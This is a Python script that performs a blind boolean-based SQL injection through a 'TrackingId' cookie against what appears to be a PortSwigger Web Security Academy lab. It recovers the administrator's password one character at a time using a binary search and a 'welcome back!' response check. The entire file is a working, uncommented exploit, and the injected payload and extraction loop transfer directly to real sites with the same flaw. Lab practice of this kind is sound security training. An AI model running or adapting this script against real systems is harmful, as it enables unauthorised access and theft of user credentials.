#!/usr/bin/env python3

from string import ascii_lowercase, digits
import requests

url = "https://0ac000fb043310848261ec1800480012.web-security-academy.net/"
password_chars = digits + ascii_lowercase

session = requests.Session()

def find_char_at_position(position):
    low, high = 0, len(password_chars) - 1

    while low <= high:
        mid = (low + high) // 2
        char = password_chars[mid]

        cookies = {
            "TrackingId": f"IvBR1r7irTSwIvM0' AND SUBSTRING((SELECT Password FROM users WHERE username = 'administrator'), {position}, 1) > '{char}"
        }
        response = session.get(url, cookies=cookies)

        if "welcome back!" in response.text.lower():
            high = mid - 1
        else:
            low = mid + 1

    if low >= len(password_chars):
        return None
    return password_chars[low]

password = ''

try:
    for i in range(1, 33):
        char = find_char_at_position(i)
        if char is None:
            break
        password += char
        print(f'Position {i}: {char}')

except requests.RequestException as e:
    print(f"Request failed: {e}")

print(f'The password is: {password}')

